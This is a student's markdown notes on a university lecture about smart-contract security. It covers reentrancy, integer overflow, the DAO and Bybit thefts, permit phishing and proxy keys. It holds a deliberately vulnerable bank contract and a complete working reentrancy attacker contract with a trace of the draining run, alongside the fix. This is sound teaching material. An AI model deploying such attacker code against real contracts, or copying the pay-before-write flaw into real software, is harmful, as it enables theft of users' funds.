# Week 11: Security: How Contracts Get Robbed (slides)

**Blockchain · Week 11 · 24 pages · Dr. Jalolliddin Yusupov · dated 11/21/2026 · online, asynchronous**
Source: [week11 - Security - How Contracts Get Robbed (slides).pdf](../slides/week11%20-%20Security%20-%20How%20Contracts%20Get%20Robbed%20(slides).pdf) *(3.9 MB, eClass slide 73944)*
Lecture code: [`resources/week11 - Security source/contracts/`](../../resources/week11%20-%20Security%20source/contracts/):
`L14_1_ClassBank.sol` (the broken bank), `L14_2_ClassBankFixed.sol` (the repaired bank), `L14_3_Thief.sol` (the attacker).

Built from the rendered pages, since the text layer holds little more than the titles. The arithmetic below was re-checked.
Notes marked *(my note)* are my own explanations and are not on the slides. The file behind the PDF is "Slide 14
Security", and the code files start with `L14_`: this is **Lecture 14**, right after
[Tokens](week10%20-%20Tokens%20-%20Money%20Made%20of%20Code%20(slides).md) (Lecture 13). It reuses ClassCoin from that
deck and the DAO fork from [Wallets, Forks and Types of Blockchain](week08%20-%20Wallets,%20Forks%20and%20Types%20of%20Blockchain%20(slides).md).
The next lecture is announced as **contracts that trade with each other**.

> **Homework 3, Part B** ([README](../../homework/hw3/README.md)) is built on this lecture: rob ClassBank with the
> Thief, then repair it, with your own numbers. This page explains the lecture's own run (8 ETH + 1). It does not give
> the homework's answers, so work them out with your own D1, D2 and V.

## The five questions the lecture answers

The opener (p. 2): *"To rob a bank you need a mask, a fast car and a lot of luck. To rob a contract you only need to
read."* The code is public, the money sits inside it, anyone may call any public function as often as they like, and no
policeman can take a block back. Once, in 2016, Ethereum itself did undo a robbery (the DAO fork); it has never done it
again. The whole lecture is about **one object**: a tiny bank made of code that holds **9 ETH** and is emptied in **one transaction**.

| # | Question | Teaser (p. 2) | Answer (p. 23) |
|---|---|---|---|
| 1 | How does code hold ETH? | a vault and a book | `payable` lets ETH in; the book is only a promise |
| 2 | How is it robbed? | one function, called again | paid first, written later: called again in between |
| 3 | How do we defend it? | three steps, in order | check, write, then pay |
| 4 | And if the code is right? | then they rob the person | read what you sign; limit it; take it back |
| 5 | Who can change the code? | the keys behind a contract | a proxy: whoever holds the key changes the program |

*"Security is not a feature you add at the end. It is the order in which you do things."*

## The DAO, June 2016: the robbery behind the fork (p. 3)

In the forks lecture we saw the ending (block 1,920,000: Ethereum changed its own rules to return the money, Ethereum
Classic refused) but never asked **how** the money was taken. **The warning came first:** days before the attack,
developers wrote in public that the code could be called again before it had finished. The fund was already full, and
nobody can stop a running contract.

| Date | Event |
|---|---|
| 30 Apr 2016 | The DAO opens: a fund that is only a program |
| 21 May 2016 | over **150 million dollars**, from more than **11,000** people |
| 17 Jun 2016, 03:34 | block **1,718,497**: the first attack transaction |
| the same day | **3.6 million ETH** moved out, about a third of the fund |
| 20 Jul 2016 | block **1,920,000**: the hard fork gives the money back |

One block before the attack, the DAO's account held **11,599,353 ETH** (read from the chain). *(my note: 3.6 M ÷ 11.6 M ≈ 31%, so "a third" ✓.)*

## Why a contract is an easy target: four facts (p. 4)

Not a weaker lock but a different world: a bank hides its software, watches every client and can cancel a payment. A
contract has none of these. That is its purpose, and also its danger.

| | A bank's computer | A contract on Ethereum |
|---|---|---|
| Who can read the code? | only the bank's staff | **everybody**: the bytecode is in the state, and usually the source is on Etherscan |
| Where is the money? | in a system behind the software | **inside the contract's own account** |
| Who can press the buttons? | a client, through a counter or an app | any account, and **any other contract**, thousands of times in one transaction |
| Can a mistake be undone? | yes: the bank reverses the payment | **no**: after finality, nobody can |

*"Public code, money inside, anyone may call, no undo."*

## Part 1: a contract that holds ETH (pp. 5–7)

| Word | Meaning |
|---|---|
| **`payable`** | This function may receive ETH. A function **without** it refuses every wei and reverts |
| **`msg.value`** | How many wei came with this call. In Remix it's the **Value** box we always left at 0 |
| **`call{value: amount}("")`** | How a contract **pays**: send `amount` wei to an address. It returns `ok`, a `bool` (true/false): true if the payment arrived |
| **vault** | The contract's **real ETH**, its own account balance (`address(bank).balance`) |
| **book** | `balanceOf`, a mapping: **a promise** of who may take how much. Two things, not one |

**ClassBank: a whole bank in 13 lines** (p. 6, = `L14_1_ClassBank.sol`):

```solidity
contract ClassBank {
    mapping(address => uint256) public balanceOf;

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "ClassBank: nothing to withdraw");   // ① check
        (bool ok, ) = msg.sender.call{value: amount}("");        // ② pay
        require(ok, "ClassBank: payment failed");
        balanceOf[msg.sender] = 0;                               // ③ write
    }
}
```

**Read the order: ① check, ② pay, ③ write. "Remember this order."** ① `amount` = what the book says I own; if it's 0,
stop. ② pay it. ③ only now set my row in the book to 0.

**First tries with `deposit`** (p. 5, Remix VM):

| What we try | Result | Gas |
|---|---|---|
| Account 1 calls `deposit` with Value **5 ETH** | status 1: the contract's own balance is 5 ETH; Account 1's row says 5 ETH | 43,601 |
| Account 2 calls `deposit` with Value **3 ETH** | status 1: the contract now holds **8 ETH**; Account 2's row says 3 ETH | 43,601 |
| Account 2 sends 1 wei to `withdraw` (not payable) | **status 0**: a function without `payable` refuses every wei and reverts | 21,162 |

**Run it: honest customers, and the bank works** (p. 7):

| # | Who | Transact | Result | Vault (ETH) | Book: Acc 1 · Acc 2 | Gas |
|---|---|---|---|---|---|---|
| 1 | Account 1 | `deposit`, Value 5 ETH | done | 5 | 5 · 0 | 43,601 |
| 2 | Account 2 | `deposit`, Value 3 ETH | done | **8** | 5 · 3 | 43,601 |
| 3 | Account 1 | `withdraw` | done: 5 ETH back in Account 1 | **3** | 0 · 3 | 28,707 |
| 4 | Account 1 | `withdraw` again | **failed**: "ClassBank: nothing to withdraw" | 3 | 0 · 3 | 23,687 |

**Vault and book agree:** after every step, the ETH in the vault equals the sum of the rows in the book. That is what a
correct bank looks like. The slide asks which line refused step 4: *(my note: check ①,
`require(amount > 0, …)`, because Account 1's row is already 0; its message is the one Remix shows.)*

## Part 2: the robbery (pp. 8–12)

### The fact the bank forgot: paying a contract runs its code (p. 8)

**`receive()`:** a special function a contract may have. It runs **every time the contract is paid ETH**, by anybody.
An ordinary account (a key, no code) has no code, so nothing runs.

| Paying a person's account | Paying a contract |
|---|---|
| The bank pays 5 ETH to Account 1 (a key, no code). The ETH arrives, nothing else happens, the bank goes on to its next line | The bank pays 1 ETH to a contract: **its `receive()` runs now, in the middle of the bank's function. It may call anything** |

*"The bank believes it is paying a customer. It is really handing control to a stranger's program."* Paying is not a
quiet step: it hands control to the receiver.

### The Thief: a customer made of code (p. 9, = `L14_3_Thief.sol`)

```solidity
import "./L14_1_ClassBank.sol";

contract Thief {
    ClassBank bank;

    constructor(address bankAddress) {
        bank = ClassBank(bankAddress);
    }

    function attack() public payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}
```

| Piece | What it does |
|---|---|
| `bank` | the address of ClassBank, so this contract can call it |
| `attack()` | deposit 1 ETH like any customer, then ask for it back. **Completely legal so far** |
| `receive()` | each time the bank pays me: **if the bank still has ETH, call `withdraw` again**, before the bank has reached its line ③ |
| `1 ether` | = 10¹⁸ wei |
| `address(bank).balance` | the bank's **vault** |

**Nothing is hacked:** no key is stolen, no rule of Ethereum is broken. The Thief only calls public functions. In Remix,
deploy it as **Account 3**, with the bank's address in the box next to Deploy.

### The robbery, call by call (p. 10)

One transaction from Account 3: `Thief.attack()`, Value **1 ETH**. Read the boxes from outside in: each box is a function
that has **started and not yet finished**. The bank's `withdraw` is waiting at step ② while the Thief calls it again, and again.

```
Thief.attack()  (Value 1 ETH)
└─ bank.deposit(1 ETH)            → vault 9 ETH · book says: Thief owns 1
└─ bank.withdraw()  call 1         ① book says 1 ✓   ② pay 1 ETH → vault 8
   └─ Thief.receive() → bank.withdraw()  call 2      ① book STILL says 1 ✓   ② pay 1 ETH → vault 7
      └─ Thief.receive() → bank.withdraw()  call 3   ① book STILL says 1 ✓   ② pay 1 ETH → vault 6
         └─ … and so on, 9 payments in all, until the vault is 0
            only then does each call reach line ③ and write 0 into the book, nine times over
```

**"The check passed 9 times, because the bank paid before it wrote."** The book was read nine times and written only at
the very end.

*(my note, the mechanism in three points:*
1. *Check ① reads the Thief's row, which stays at 1 the whole time, because line ③ of every call is still waiting
   behind its own payment. So each call pays exactly 1 ETH.*
2. *The Thief's `receive()` decides when to stop by looking at the bank's **vault**, not at its own row. It asks again
   while the vault still holds at least 1 ETH. After the 9th payment the vault is 0, `receive()` does nothing, and the
   nested calls finish from the inside out.*
3. *`call{value: …}` forwards almost all the remaining gas to the receiver, so `receive()` has enough gas to call the
   bank again. The older `transfer`/`send` forward only 2,300 gas, too little for a call like this. That isn't the fix
   the lecture teaches, though.)*

### After the robbery: the book says 8 ETH, the vault is empty (p. 11)

The Thief put in **1 ETH** and took out **9 ETH**: its own, plus the 8 ETH of Account 1 and Account 2. Gas for the whole
robbery: **111,356**.

| | Before the attack | After the attack |
|---|---|---|
| the vault: ETH held by ClassBank | 8 ETH | **0 ETH** |
| ETH held by the Thief contract | 0 ETH | **9 ETH** |
| the book: Account 1 · Account 2 · Thief | 5 · 3 · 0 | 5 · 3 · 0 |
| payments from the bank inside the one transaction | — | 9, each of 1 ETH |
| Account 1 calls `withdraw` | would receive 5 ETH | **failed**, 30,788 gas paid for nothing |

**The victims notice later:** the book still promises them 5 and 3 ETH. When Account 1 asks for its money, the bank
answers **"ClassBank: payment failed"**. *"The promise survived; the money did not."*

*(my note: this run starts from a fresh bank after steps 1–2 of p. 7 only (vault 8, book 5 · 3), not after step 3,
where Account 1 had already taken its 5 ETH back. The Thief's row is 0 both before and after: its 1 was written in by
the deposit and set back to 0 by line ③.)*

### New word: reentrancy, and why the DAO fell (p. 12)

**Reentrancy:** entering a function **again** before its first run has finished. It is possible whenever a contract
hands control to a stranger (by paying or calling) **before** it has updated its own book.

**The same mistake, 2016:** the DAO's code paid people who were leaving the fund, and only afterwards wrote that they had
left. The attacker's contract asked again in between.

| | Our ClassBank | The DAO, 17 June 2016 |
|---|---|---|
| money inside before the attack | 8 ETH + the Thief's 1 | **11,599,353 ETH** |
| the order of the steps | check, pay, write | check, pay, write |
| what left | all 9 ETH, in one transaction | about 3.6 million ETH, about a third |
| was it undone? | no | yes, once: the hard fork at block 1,920,000 |
| the chain that refused to undo it | — | Ethereum Classic |

*"Reentrancy: paid first, written later."*

## Part 3: the defence (pp. 13–16)

### One line in a different place (p. 13, = `L14_2_ClassBankFixed.sol`)

**The whole repair:** move the line that writes the book **above** the line that pays. Nothing is added, nothing is removed.

| BEFORE: ① check, ② pay, ③ write | AFTER: ① check, ② write, ③ pay |
|---|---|
| `require(amount > 0, …)` | `require(amount > 0, …)` |
| `(bool ok, ) = msg.sender.call{value: amount}("");` | `balanceOf[msg.sender] = 0;` |
| `require(ok, …)` | `(bool ok, ) = msg.sender.call{value: amount}("");` |
| `balanceOf[msg.sender] = 0;` | `require(ok, …)` |

*"First settle your own book, then hand control to anybody else."*

**Checks, effects, interactions** (p. 14, *new word*): the programmers' name for this order. First **check**, then write
your own data (the **effects**), and only at the end talk to others (the **interactions**). *(my note: usually shortened
to **CEI**, the "checks-effects-interactions pattern".)*

### Run it: the same Thief, the repaired bank (p. 14)

**The second call finds an empty row.** The bank writes 0 **before** it pays. When the Thief calls again, check ①
reads 0 and stops. **The whole attack is undone**, and the Thief still pays **65,289 gas**.

| | The broken bank | The repaired bank |
|---|---|---|
| the Thief's `attack`, Value 1 ETH | done | **failed**: "ClassBank: payment failed" |
| the vault afterwards | **0 ETH** | **8 ETH** |
| ETH held by the Thief contract | 9 ETH | 0 ETH |
| Account 1 calls `withdraw` | failed: "ClassBank: payment failed" | done: 5 ETH back; the vault holds 3 ETH |
| size of the program | 1,243 bytes | 1,243 bytes: the same |

### A second kind of bug: numbers that wrap around (p. 15)

**Overflow:** a result that doesn't fit its type. A `uint256` can't go below 0, so 250 − 1,000 doesn't fit. Since
**Solidity 0.8.0 (Dec 2020)** every + and − is checked: an overflow reverts with **Panic 0x11**.

**War story, before 0.8.0:** 250 − 1,000 quietly became a **78-digit number**. In **April 2018** one such wrap in the
**BeautyChain (BEC)** token let attackers create tokens out of nothing (**CVE-2018-10299**). Holders were left with a worthless coin.

Test: ClassCoin (from the Tokens lecture) **without its `require` line**; Account 2 owns 250 and sends 1,000:

| | What Remix VM reports |
|---|---|
| status | **0: failed**, the transaction reverted |
| the bytes it returned | `0x4e487b71` (Panic) + `…11` (code 0x11: overflow) |
| gas used | 24,589 |
| balances afterwards | 750 · 250 · 0: nothing changed |

*(my note: the 78 digits check out: 2²⁵⁶ − 750 = 115792…129639186, 78 digits. In the Tokens lecture the same bad
transfer with the `require` failed with "ClassCoin: not enough coins" for 24,695 gas; without it, the compiler's own
check catches it. ClassBank sets the row to `= 0` and never subtracts, so the 0.8 check plays no part in the robbery.)*
*"Some whole families of bugs are now stopped by the compiler."*

### How real projects defend themselves (p. 16)

No single wall: every serious project uses several of these together. Each catches what another misses, and none catches everything.

| Defence | What it is | What it cannot do |
|---|---|---|
| **tested library** | use code thousands have read, like OpenZeppelin, instead of writing your own | protect the lines you add yourself |
| **audit** | pay another team to read the code line by line before launch | promise there is no bug: it finds some, never all |
| **testnet first** | run for weeks on Sepolia, where ETH is free | attract real thieves: nothing there is worth stealing |
| **bug bounty** | a public reward for anyone who reports a bug instead of using it | outbid a thief when the vault is very large |
| **pause button** | one address may stop the contract, like `pause()` in USDT | help unless somebody is awake; and it is itself a key to steal |

*"Good code is necessary. It is not enough."*

## Part 4: when the code is right (pp. 17–20)

### No bug at all: Bybit, 21 February 2025 (p. 17)

**Everything was done right:** the money was in a **cold wallet**, and it was a **multisig** (several people had to sign,
each with their own key). No contract had a bug. **And still:** the thieves had broken into the **website** the signers
used. The signers believed they were approving a routine transfer. What they really signed gave the wallet **a new program**.

| Time (UTC) | Transaction | What happened |
|---|---|---|
| 14:13:35 | `0x46de…7882`, 70,224 gas | the wallet's address now runs the thieves' program |
| 14:15:11 | `0x2580…17c9` | first, one token is swept out of the wallet |
| 14:16:11 | `0xb614…072c`, 60,981 gas | all the ETH leaves, **about 400,000 ETH** |
| today (read 19 Nov 2026) | — | the wallet holds 0 ETH; its storage still points to `0xbdd0…9516` |

**From the first transaction to the empty wallet: 2 min 36 s** (14:13:35 → 14:16:11 ✓).
*"The wallet protects the key, not your judgement."*

### Three things a wallet asks you to do (p. 18)

**Phishing:** tricking a person into pressing the button themselves (a fake website, a fake support chat, a fake airdrop).
**The key is never stolen. The owner is.**

| The request | What it is | Gas? | What it can cost you | What to read before you press |
|---|---|---|---|---|
| **Send** | a transaction that moves ETH or tokens now | yes | the amount you see | the receiver and the amount |
| **Approve** | a transaction that gives a spender a permission | yes | up to the approved amount, **later** | the spender and the limit |
| **Sign a message** | no transaction: only a signature, handed to the website | **no** | depends on the message: it can be a permission too | every field of the message |

The slide asks which of the three leaves no trace on the chain: **signing a message**. *"The quietest request can be the most expensive."*

### New word: permit, an approval with no transaction (p. 19)

| Word | Meaning |
|---|---|
| **permit** (EIP-2612, 2020) | an approval given by **signature** instead of a transaction |
| **typed data** (EIP-712, 2017) | the rule that lets a wallet show such a message as named fields, not as hex |

What a good wallet shows (*Signature request · Permit*): `owner` (your address) · `spender` (0x… who may spend) · `value`
(how many tokens) · `deadline` (until when it's valid), and **no gas · no transaction · no entry on Etherscan**.
**You sign** → a **signed form**, held by the website, not by the chain → **later**, anyone hands the form to the token
contract as `permit(…)`: the allowance is set, then `transferFrom`. *"You paid nothing and sent nothing. The permission exists anyway."*

**Whitepaper vs mainnet: not every token has it.** ERC-20 doesn't include permit. USDC's program contains it (function ID
`d505accf`); USDT's doesn't (read from both bytecodes). *"A signature can do everything an approval can, and leaves no trace until it is used."*

### Six habits that would have stopped most of these (p. 20)

For you, not for programmers: you may never write a contract, but you will certainly be asked to sign something.

| # | Habit | How |
|---|---|---|
| 1 | **The address bar** | type or bookmark the site; never arrive by a link in a chat |
| 2 | **Which request?** | send, approve, or sign? If you can't tell, don't press |
| 3 | **Who is the spender?** | an address you can check, not a name on a web page |
| 4 | **Limit it** | approve what you need today, never "unlimited" by habit |
| 5 | **Take it back** | `approve(spender, 0)` for every site you stopped using |
| 6 | **Two wallets** | a small hot one for trying things, a hardware one for savings |

And one more: **whoever hurries you is not your friend. Urgency is the thief's favourite tool.** *(my note: the slide asks
which habit would have helped the Bybit signers. No. 2 is the closest: they thought they were signing a routine
transfer, but it was a program change.)*

## Part 5: the keys behind the code (p. 21)

**Proxy:** a small contract that holds the address and the data, and **passes every call on** to a second contract that
holds the program. Change the pointer, and the same address runs new code.

**Whitepaper vs mainnet, "code on a blockchain cannot change":** true for one contract's bytes, but not for what an
**address** does if it's a proxy. USDC is one, read from the chain:

| Part | Address | What it is |
|---|---|---|
| the address everyone knows | `0xa0b869…06eb48` | **2,186 bytes** of code, no `transfer` in it; keeps all the balances; says "my program is at …" |
| the program, today | `0x435068…4402dd` | **23,464 bytes**; it answers version "2" |
| another program, tomorrow? | — | one address may change the pointer: **the admin, `0x807a…95d2`** |

**21 February 2025 was exactly this:** the thieves changed the pointer of Bybit's wallet to their own program.
*"Ask of every contract: who holds the key that can change it?"*

## Four ways the money leaves, and the defence for each (p. 22)

Read it as a checklist: before you trust a contract with money, and before you sign anything, walk down the first column.

| How the money leaves | Our example today | A real one | The defence |
|---|---|---|---|
| **the order of the steps** (reentrancy) | ClassBank: 9 ETH in one transaction | the DAO, 2016: about 3.6 million ETH | check, write, then pay |
| **numbers that wrap** (overflow) | 250 − 1,000 → Panic 0x11 | BeautyChain, 2018 | compiler 0.8.0 or newer; tested libraries |
| **the owner signs** (phishing, permit) | approve without a limit; a signed form | Bybit, 2025: about 400,000 ETH in 2 min 36 s | read the request, limit it, take it back |
| **the key behind the code** (owner, proxy admin) | USDC's program pointer; USDT's `pause()` | the same Bybit wallet: its program was replaced | know who holds the key; several signers; a second look |

"Which row needs no programmer to make the mistake?" **The owner signs.** *"Bugs, arithmetic, people, keys."*

**What you can do now** (p. 23): read a `withdraw` function and say whether it pays before it writes; read a wallet
request and say whether it's a send, an approval or a signature; ask who holds the key. *(my note: the slide's last
question is "if the code is public, why do robberies still happen?" The deck's answer runs through Parts 4–5: reading
the code doesn't help when the person signs the wrong thing or the key holder changes the program.)*

## Slide errors and loose claims

No wrong numbers found; the vault/book arithmetic, the DAO third, the 2 min 36 s and the 78 digits all check out. One
stale title and two loose words:

1. **p. 2, copied title.** It reads "New Word: Token, a Coin That Lives in a Contract", left over from the Tokens deck.
   The page is really this lecture's opener ("One tiny bank, five questions"). Only the title is stale.
2. **p. 15, "overflow" for 250 − 1,000.** Going **below** 0 is strictly an *underflow*. Solidity's Panic 0x11 covers both
   ("arithmetic overflow or underflow"), so the slide is fine by Solidity's naming. If a quiz says "underflow", it means the same thing.
3. **p. 15, BeautyChain as "one such wrap".** BEC's bug (CVE-2018-10299, `batchTransfer`) was an overflow in a
   **multiplication** (number of receivers × amount wrapped to a tiny number), not a subtraction like 250 − 1,000 *(my note)*.
   The lesson is the same: unchecked arithmetic before 0.8.0.

Video: the matching lecture is on eClass as VOD 73981 (1:09:59), not mirrored or transcribed yet. The code is eClass file 73974.
